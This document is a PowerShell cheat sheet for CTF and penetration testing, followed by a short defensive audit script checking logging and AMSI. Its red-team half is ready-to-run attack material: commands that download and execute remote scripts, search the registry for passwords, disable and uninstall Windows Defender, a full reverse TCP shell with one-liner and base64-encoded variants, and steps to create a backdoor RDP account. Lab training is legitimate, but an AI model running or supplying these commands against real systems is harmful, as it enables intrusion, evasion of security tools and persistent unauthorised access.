
=== CORE Ps1 COMMANDS FOR CTF/PENTESTING ===

#REDTEAM
=== Know your environment 
$PSVersionTable.PSVersion
 *in CMD
powershell -command $PSVersionTable.PSVersion

1. Basic System Enumeration
whoami
hostname
systeminfo
Get-ComputerInfo
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember Administrators

2. File & Directory Recon
dir
ls
Get-ChildItem -Recurse
Get-Content file.txt
type file.txt
 *Search for interesting files
Get-ChildItem -Path C:\ -Include *.txt,*.xml,*.config -Recurse -ErrorAction SilentlyContinue

3. Permissions & Privilege Checks
whoami /priv
whoami /groups
 *Check for file permissions
icacls file.exe

4. Processes & Services (Very Important in HTB
Get-Process
Get-Service
Get-Service | Where-Object {$_.Status -eq "Running"}
 *Look for weak services
Get-WmiObject win32_service | Select Name, StartName, PathName

5. Network Enumeration
ipconfig
netstat -ano
arp -a
route print
Get-NetTCPConnection
Get-NetIPAddress

6. User & Credential Hunting
cmdkey /list
 *Search registry for creds
reg query HKLM /f password /t REG_SZ /s

7.File Download / Upload (CTF Essential)
Invoke-WebRequest http://10.10.14.1/file.exe -OutFile file.exe
*Shortened 
iwr http://10.10.14.1/file.ps1 -o file.ps1

8. Script Execution (Common in PrivEsc)
powershell -ExecutionPolicy Bypass -File script.ps1
or
iex (iwr http://10.10.14.1/script.ps1)

9. Encoding & Decoding (Payload Stuff)
 *Encode
[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("text"))
 *Decode
[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("encoded"))

10. Environment & Variables
Get-ChildItem Env:
echo $env:USERNAME
echo $env:PATH
Get-MpComputerStatus

11. AV & Defender Checks
Get-MpComputerStatus
Get-MpPreference

12. Disable Defender Real-Time Monitoring
Set-MpPreference -DisableRealtimeMonitoring $true

13. Disable Defender All Major Features
Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true

14. Check if everything (services) is off
Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled, AntivirusEnabled, IsTamperProtected
( RealTimeProtectionEnabled: Should be False.
AntivirusEnabled: Should be False. )

15. Uninstall Defender (Windows Server Only)
Uninstall-WindowsFeature -Name Windows-Defender

16. Running an exe with Admin privs
Start-Process -FilePath "C:\Path\To\YourFile.exe" -Verb RunAs
 *Running from current directory
Start-Process .\mytool.exe -Verb RunAs
 *with silent or install flag
Start-Process -FilePath "C:\temp\installer.exe" -ArgumentList "/silent", "/norestart" -Verb RunAs

16. Reverse TCP Shell
# PowerShell Reverse TCP Shell
# Replace $attacker_ip and $attacker_port with your listener's IP and port

$attacker_ip = "192.168.1.100"  # Change this to your IP
$attacker_port = 4444           # Change this to your port

$client = New-Object System.Net.Sockets.TCPClient($attacker_ip, $attacker_port)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()

 *Save the script as reverse_shell.ps1

16.2 One liner
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.1.100',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

16.3 Encode
$command = '$client = New-Object System.Net.Sockets.TCPClient(''192.168.1.100'',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
$encodedCommand

16.3.1 Execute
powershell -enc theencodedscript

#RDP
1. Define the user and the password directly
$UserName = "RDP_User"
$Pass = ConvertTo-SecureString "SecurePass123!" -AsPlainText -Force

2. Create the user
New-LocalUser -Name $UserName -Password $Pass -FullName "Remote Access"

3. Add to the RDP group
Add-LocalGroupMember -Group "Remote Desktop Users" -Member $UserName

4. Open the 'Remote Desktop' door
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

5. Delete account entirely 
Remove-LocalUser -Name "RDP_User"

6. Revoke RDP Access only (Keep the user)
Remove-LocalGroupMember -Group "Remote Desktop Users" -Member "RDP_User"

#View RDP Accounts
1. See All Local Accounts
Get-LocalUser

2. See ONLY the RDP "VIP List"
Get-LocalGroupMember -Group "Remote Desktop Users"

3. The "Search and Find" (For specific names)
Get-LocalUser -Name "RDP_User*"


#BLUETEAM
Specific PowerShell command to see if your system is currently being monitored by AMSI or Script Block Logging

Here is a script you can copy and paste into your PowerShell terminal to audit your current settings.

=== The PowerShell Security Audit Script ===

Write-Host "--- PowerShell Security Audit ---" -ForegroundColor Cyan

# 1. Check Language Mode
# Note: 'FullLanguage' is standard for Admins. 'ConstrainedLanguage' is more secure for standard users.
$LanguageMode = $ExecutionContext.SessionState.LanguageMode
$LMColor = if ($LanguageMode -eq 'FullLanguage') { 'Red' } else { 'Green' }
Write-Host "[!] Language Mode: $LanguageMode" -ForegroundColor $LMColor

# 2. Check Script Block Logging (Event ID 4104)
$SBLPath = "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
if (Test-Path $SBLPath) {
    $SBL = Get-ItemProperty -Path $SBLPath -ErrorAction SilentlyContinue
    $SBLStatus = if ($SBL.EnableScriptBlockLogging -eq 1) { "ENABLED" } else { "DISABLED" }
} else {
    $SBLStatus = "DISABLED (Registry Key Not Found)"
}
$SBLColor = if ($SBLStatus -eq 'ENABLED') { 'Green' } else { 'Red' }
Write-Host "[!] Script Block Logging: $SBLStatus" -ForegroundColor $SBLColor

# 3. Check Transcription
$TransPath = "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription"
if (Test-Path $TransPath) {
    $Trans = Get-ItemProperty -Path $TransPath -ErrorAction SilentlyContinue
    # CORRECTED: Registry value is 'EnableTranscripting', not 'EnableTransmit'
    $TransStatus = if ($Trans.EnableTranscripting -eq 1) { "ENABLED" } else { "DISABLED" }
} else {
    $TransStatus = "DISABLED (Registry Key Not Found)"
}
$TransColor = if ($TransStatus -eq 'ENABLED') { 'Green' } else { 'Red' }
Write-Host "[!] Transcription (Console Logging): $TransStatus" -ForegroundColor $TransColor

# 4. Check for AMSI (Antimalware Scan Interface)
# We reconstruct the test string at runtime so this script file isn't deleted by antivirus immediately.
$Part1 = 'AMSI Test Sample: '
$Part2 = '7e72c343-9e55-4093-7955-aa213df8802d'
$TestString = $Part1 + $Part2

Write-Host "[-] Testing AMSI..." -NoNewline
try {
    # We try to invoke the test string. If AMSI is working, it should THROW an error.
    Invoke-Expression $TestString | Out-Null
    
    # If we get here, AMSI failed to catch it.
    Write-Host " FAILED (AMSI did not block the test string)" -ForegroundColor Red
}
catch {
    # If the error contains "malicious", AMSI is working!
    if ($_.Exception.Message -match "malicious") {
        Write-Host " SUCCESS (AMSI blocked the test string)" -ForegroundColor Green
    } else {
        Write-Host " UNKNOWN ERROR ($($_.Exception.Message))" -ForegroundColor Yellow
    }
}

save as check.ps1

What these results mean for your safety
If your results came back mostly in Red, it means your PowerShell environment is "Standard." Itâ€™s built for convenience, not high security.


How to see the logs yourself
If you want to see the "evidence" your machine is currently collecting, you can open the Event Viewer and run this command to find the most recent PowerShell activity:

Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 10 | Select-Object TimeCreated, Message | Format-List



=============================


"...Keep on learning
 Keep on training 
 Keep on getting smarter"
- Oliver Queen
Arrow (U.S. TV series)












